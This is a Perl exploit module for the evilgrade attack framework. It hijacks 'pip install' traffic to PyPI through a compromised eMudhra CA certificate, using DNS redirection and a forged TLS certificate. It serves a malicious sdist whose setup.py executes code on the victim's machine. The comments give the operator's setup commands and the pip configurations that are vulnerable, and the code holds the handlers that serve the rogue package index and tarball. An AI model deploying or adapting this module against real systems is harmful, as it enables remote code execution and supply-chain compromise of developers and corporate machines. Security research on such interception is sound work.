###############
# pypi_update.pm
#
# pip install MITM via the compromised eMudhra CA.
#
# `pip install <pkg>` fetches the PEP503 simple index + the package sdist, then
# BUILDS it -- running the sdist's setup.py at install time (that is the RCE).
# PyPI does not sign sdists, so integrity rests on TLS. If pip validates TLS
# against the system trust store /etc/ssl/cert.pem, it still trusts the revoked,
# Apple-blocked eMudhra intermediate "EM DV TLS CA - G3C", so an on-path
# attacker serves a malicious sdist whose setup.py executes code as the user.
#
# IMPORTANT (verified): pip DEFAULT is NOT vulnerable -- it ships its own
# vendored certifi bundle (Mozilla roots), which does NOT contain the AAA root
# the eMudhra intermediate chains to. pip is only exploitable when it is pointed
# at the SYSTEM trust store, i.e. any of:
#   * pip install --cert /etc/ssl/cert.pem ...
#   * PIP_CERT=/etc/ssl/cert.pem  (env)
#   * pip.conf:  [global] cert = /etc/ssl/cert.pem
#   * a distro-/corp-packaged pip/python that uses the OS store instead of certifi
# This is common in corporate environments -- which are also exactly where an
# eMudhra (or corporate) CA would be installed in the first place.
#
# Homebrew's python and pip's default certifi are NOT affected.
#
# Use with: set sslport 443, set sslcert certs/emudhra_mitm, enable + start
# (the DNS server answers pypi.org automatically from this vh). Then the victim
# runs a BARE pip install -- pip's default index is https://pypi.org/simple, so
# no --index-url is needed once DNS points pypi.org at evilgrade:
#   /usr/bin/python3 -m pip install --cert /etc/ssl/cert.pem evilpkg
#
# The index uses a RELATIVE href so the sdist is served from the same host as
# the index -- no second (files.pythonhosted.org) origin needed.
#
# This file is part of isr-evilgrade, www.faradaysec.com .
##
package modules::pypi_update;

use strict;
use Data::Dump qw(dump);
use isrcore::utils;

my $base = {
    'name'        => 'pip install MITM (eMudhra CA)',
    'version'     => '1.1',
    'appver'      => 'pip using the system trust store (/etc/ssl/cert.pem)',
    'cve'         => 'eMudhra intermediate key compromise (2026)',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>', 'Security Research Team'],
    'description' => qq{
Intercepts pip's PyPI traffic and serves a malicious sdist whose setup.py runs
at install time -> code execution as the user. PyPI does not sign sdists, so
integrity rests on TLS. Exploitable when pip validates against the system trust
store (--cert /etc/ssl/cert.pem, PIP_CERT, pip.conf, or a distro/corp pip) --
NOT with pip's default vendored certifi bundle. Set 'sslcert' to
certs/emudhra_mitm.
},
    'vh' => '(pypi.org|files.pythonhosted.org|pypi.python.org)',
    'request' => [
        {   'req'    => '/simple/evilpkg/?$',
            'type'   => 'file',
            'method' => '', 'bin' => 0, 'string' => '', 'parse' => 0,
            'file'   => './include/pip_mitm/simple/evilpkg/index.html',
            'cheader' => "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\n\r\n",
        },
        {   'req'    => '/.*evilpkg-1\.0\.tar\.gz',
            'type'   => 'file',
            'method' => '', 'bin' => 1, 'string' => '', 'parse' => 0,
            'file'   => './include/pip_mitm/simple/evilpkg/evilpkg-1.0.tar.gz',
            'cheader' => "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nConnection: close\r\n\r\n",
        },
    ],
    'options' => {
        'enable' => { 'val' => 0, 'desc' => 'Status' },
        'agent'  => { 'val' => './include/pip_mitm/simple/evilpkg/evilpkg-1.0.tar.gz', 'desc' => 'Required by webserver (the malicious sdist)' },
    }
};

sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
